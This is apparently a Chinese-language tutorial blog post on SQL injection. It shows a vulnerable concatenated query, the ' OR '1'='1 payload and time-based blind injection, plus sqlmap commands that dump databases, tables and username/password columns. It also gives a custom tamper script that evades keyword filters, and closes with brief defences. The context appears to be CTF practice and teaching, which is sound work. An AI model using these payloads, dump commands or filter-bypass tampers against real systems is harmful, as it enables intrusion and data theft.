---
title: sql注入攻击
date: 2022-09-27 18:55:35
tag:
- 信息安全
- 网络攻防
- sql
- sql注入
- sqlmap
categories: 
- 网络
- 网络安全

---

# WHAT: sql注入是什么
在输入的字符串之中注入SQL指令。
如果代码中是以拼接用户输入成一个sql交给数据库执行的话，就很容易被此类攻击攻破。

# HOW: sql注入如何发生
假如代码中的拼接逻辑:
```java
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```
然后用户输入:`userName = "1' OR '1'='1";`
则拼接后的结果:
```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```
则sql实际逻辑发生了变化，执行了用户注入的逻辑。
攻击方不一定需要从回显中获取信息，只需要通过sleep函数即可通过时间差进行盲注。
大致攻击逻辑：
1。通过拼接sleep判断是否存在被注入点；
2。通过拼接逻辑运算+sleep判断（逻辑短路）判断某个条件是否成立；
（比如 某个表是否存在、表名的每一位字母是否正确来慢慢试探出表名）

# sqlmap工具
首先正常请求一次目标，然后将request header和payload保存到`1.txt`中，然后就可以用sqlmap来进行盲注了。

```shell script
# 1. 首先探测有哪些数据库:
sqlmap -r 1.txt --level 3 --risk 3 --dbs
# 2. 探测有哪些表:
sqlmap -r 1.txt --level 3 --risk 3 -D 上一步的db --tables
# 3. 打印指定easysql库下flag表的数据:
sqlmap -r 1.txt --level 5 --risk 3 -D easysql -T flag --dump
```
有时候会遇到目标服务器有一些简单的字符串过滤、拦截的逻辑，可以通过加tamper的方式绕过:
```shell script
sqlmap -r 1.txt  --tamper "easysql.py" --level 5 --risk 3 -D easysql --tables
```
tamper有到的文件位于:
`/Library/Python/3.7/site-packages/sqlmap/tamper/`目录下，可以通过`locate space2comment.py`来寻找对应目录。

打印指定列:
```sql 
sqlmap -r 2.txt -D ctf -T user -C "username,password" --dump -D easysql --tables
```

## 自己编写tamper
主要是实现一个`def tamper(payload, **kwargs)`方法:
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import random
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    payload= payload.lower()
    payload= payload.replace('union' , 'uniunionon')
    payload= payload.replace('select' , 'selselectect')
    payload= payload.replace('where' , 'whewherere ')
    payload= payload.replace('or' , 'oorr')
    payload= payload.replace('ro' , 'rroo')
    payload= payload.replace('flag' , 'flflagag')
    payload= payload.replace("'" , '"')
    # payload= payload.replace('from' , 'frfromom')
    # payload= payload.replace('information' , 'infoorrmation')
    # payload= payload.replace('and' , 'anandd')
    # payload= payload.replace('by' , 'bbyy')
    retVal=payload
    return retVal
```

# 如何防御
1。用模版sql功能，不要自己手拼用户输入到sql;
2。校验用户输入；
3。限制用户请求频率，控制返回的时间稳定，不要让用户感知到时间差。

# 参考资料
https://copyfuture.com/blogs-details/20211205073411933f
